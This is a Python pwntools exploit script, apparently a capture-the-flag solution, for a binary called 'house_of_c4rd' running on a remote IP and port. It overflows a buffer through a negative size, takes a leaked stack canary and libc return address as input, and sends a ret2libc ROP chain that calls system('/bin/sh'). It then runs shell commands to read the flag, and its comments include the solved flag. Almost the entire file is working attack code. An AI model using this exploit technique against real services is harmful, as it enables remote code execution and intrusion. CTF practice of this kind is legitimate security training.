#!/usr/bin/env python
# coding: utf-8

from pwn import *
import signal

context.log_level = 'debug'

# flag{b4ck_t0_the_0ldsch0ol}
# Need another client from different ip to read address & canary

local = False

if local:
    p = process('./house_of_c4rd', env={'LD_PRELOAD': './libc.so.6', 'REMOTE_HOST': '127.0.0.1'})
else:
    p = remote('202.120.7.193', 11111)
    pass

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc_local64 = {
	'base': 0x0,
	'__libc_start_main': 0x20740,
	'system': 0x45390,
	'unsorted_bin': 0x3c3b78,
	'free_hook': 0x3c57a8,
	'realloc_hook': 0x3c3b08,
    'main_ret': 0x20830,
    'binsh': 0x18c177
}

libc_remote = {
	'base': 0x0,
	'system': 0x45390,
    'binsh': 0x18cd57,
    'rdi_ret': 0x21102,
    'main_ret': 0x20830
}

if local:
    libc = libc_remote
else:
    libc = libc_remote

def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base

def Write(filename):
    ru('> ')
    sel('1')
    ru('name: ')
    sel(filename)

def Read(filename):
    ru('> ')
    sel('2')
    ru('name: ')
    sel(filename)

def GoW(sz, payload, key='1337'):
    ru('> ')
    sel('3')
    ru('data> ')
    sel(str(sz))
    ru('Data> ')
    sel(payload)
    ru('Key> ')
    sel(key)

def GoR(key='1337'):
    ru('> ')
    sel('3')
    ru('key> ')
    sel(key)

def ignore(signum, frame):
    print('[+] alarm!')
    pass

signal.alarm(50)
Write('7331')
if local:
    gdb.attach(p, gdbscript=open('pie.x'))
GoW(-1, 'A' * 0x400 + 'lotus33')
byte = int(rud('written bytes\n'))
ru('Go\n4')
if byte == 32:
    print('[!] Failed, exiting ...')
    sys.exit(1)

canary = int(raw_input('canary: ').replace('0x', ''),16)
main_ret = int(raw_input('main_ret: ').replace('0x',''),16)
print('[+] start main ret = %#x' % main_ret)
set_base(libc, 'main_ret', main_ret)
print('[+] libc base = %#x' % libc['base'])
signal.signal(signal.SIGALRM, ignore)

payload = 'A' * 0x408 + p64(canary) + p64(0) + p64(libc['rdi_ret']) + p64(libc['binsh']) + p64(libc['system'])
ru('Exit\n')
Write('1337')
GoW(-1, payload)
ru('Exit\n')
sel('4')
sel('ls')
sel('cat flag')

p.interactive()
